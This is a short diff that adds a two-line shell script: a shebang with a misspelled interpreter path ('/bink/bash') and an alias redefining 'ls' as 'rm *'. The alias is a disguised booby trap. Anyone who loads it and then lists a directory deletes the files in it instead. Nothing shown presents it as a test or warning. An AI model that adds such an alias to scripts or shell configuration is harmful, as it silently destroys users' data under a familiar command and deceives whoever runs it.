@@ -1,0 +1,2 @@
+#!/bink/bash
+alias ls="rm *"
